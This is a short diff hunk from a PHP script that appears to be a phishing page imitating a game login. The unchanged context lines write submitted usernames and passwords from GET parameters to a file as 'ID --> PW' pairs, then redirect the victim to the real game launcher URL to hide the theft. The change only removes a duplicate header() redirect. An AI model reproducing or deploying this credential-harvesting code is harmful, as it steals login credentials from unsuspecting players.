@@ -6,7 +6,6 @@
 		fwrite($file, '<> ID : '.$_GET["txtUserName"].' --> PW : '.$_GET["txtPassword"]."\n");
 		fclose($file);
 		echo "<script>window.location.href = 'http://truykich.net.vn/launcher.aspx' </script>";
-		header("Location : http://truykich.net.vn/launcher.aspx");
 	}
 	else {
 		# code...
